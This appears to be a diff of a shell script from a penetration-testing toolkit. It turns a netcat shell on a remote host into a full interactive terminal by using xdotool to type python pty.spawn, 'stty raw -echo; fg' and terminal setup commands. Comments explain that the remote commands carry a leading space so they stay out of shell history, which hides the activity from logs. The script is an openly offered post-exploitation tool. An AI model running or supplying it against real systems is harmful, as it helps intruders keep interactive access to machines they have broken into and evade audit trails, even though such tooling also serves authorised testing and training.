@@ -1,20 +1,21 @@
 #!/bin/sh
-echo 'This script is used to upgrade netcat shells to fully fledged shells.\n'
-echo ''
-echo 'Paste the first command from the clipboard into the remote shell.'
-echo 'python -c '\''import pty; pty.spawn("/bin/bash")'\'' || python3 -c '\''import pty; pty.spawn("/bin/bash")'\'' || script -qc /bin/bash /dev/null' | xclip -selection clipboard
-echo -n 'Continue with any key.'
-read ignore
-
-echo 'Paste this command in your local shell'
-echo 'stty raw -echo; fg' | xclip -selection clipboard
-echo -n 'Continue with any key.'
-read ignore
-
-echo 'Back in the remote shell just paste the commands from the clipboard.'
-COLS=$(stty size | awk '{ print $2 }')
-ROWS=$(stty size | awk '{ print $1 }')
-echo "export SHELL=bash
-export TERM=xterm-256color
-stty cols $COLS rows $ROWS
-reset" | xclip -selection clipboard
+# Start this script with a shortcut inside your nc shell to upgrade its functionality to a full pty
+# Commands that are typed on the remote system are prefixed with a space to prevent saving them to history
+# Needs a sort of NOP slide because sometimes xdotool would only type after the forth or fifth character
+xdotool type ' #################'
+xdotool key Return
+xdotool type ' python -c '\''import pty; pty.spawn("/bin/bash")'\'' || python3 -c '\''import pty; pty.spawn("/bin/bash")'\'' || script -qc /bin/bash /dev/null'
+xdotool key Return
+xdotool keydown ctrl key z; sleep .1; xdotool keyup ctrl
+xdotool type 'stty size | xclip -selection clipboard'
+xdotool key Return
+xdotool type 'stty raw -echo; fg'
+xdotool key Return
+xdotool type ' export SHELL=bash'
+xdotool key Return
+xdotool type ' export TERM=xterm-256color'
+xdotool key Return
+xdotool type " stty cols $(xclip -o -selection clipboard | awk '{print $2}') rows $(xclip -o -selection clipboard | awk '{print $1}')"
+xdotool key Return
+xdotool type ' reset'
+xdotool key Return
